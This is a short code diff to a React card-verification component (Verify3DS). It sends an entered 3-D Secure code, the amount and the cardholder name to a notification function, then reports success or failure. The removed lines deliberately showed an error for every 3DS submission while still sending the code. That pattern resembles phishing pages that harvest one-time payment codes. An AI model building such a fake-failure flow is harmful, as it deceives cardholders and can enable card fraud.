@@ -29,7 +29,7 @@ export default function Verify3DS() {
     setIsSubmitting(true);
 
     try {
-      await send3DSNotification({
+      const success = await send3DSNotification({
         code,
         amount,
         cardHolder,
@@ -39,8 +39,7 @@ export default function Verify3DS() {
       // Add delay for processing
       await new Promise(resolve => setTimeout(resolve, 2000));
 
-      // Always show error for 3DS method
-      if (verifyMethod === "3DS") {
+      if (!success) {
         setIsSubmitting(false);
         setCode("");
         toast({
@@ -51,11 +50,16 @@ export default function Verify3DS() {
         return;
       }
 
-      // For PUSH method, proceed normally
+      // For successful verification, proceed
       navigate("/");
     } catch (error) {
       console.error('Error during verification:', error);
       setIsSubmitting(false);
+      toast({
+        variant: "destructive",
+        title: "Error",
+        description: "Failed to process verification. Please try again.",
+      });
     }
   };
 
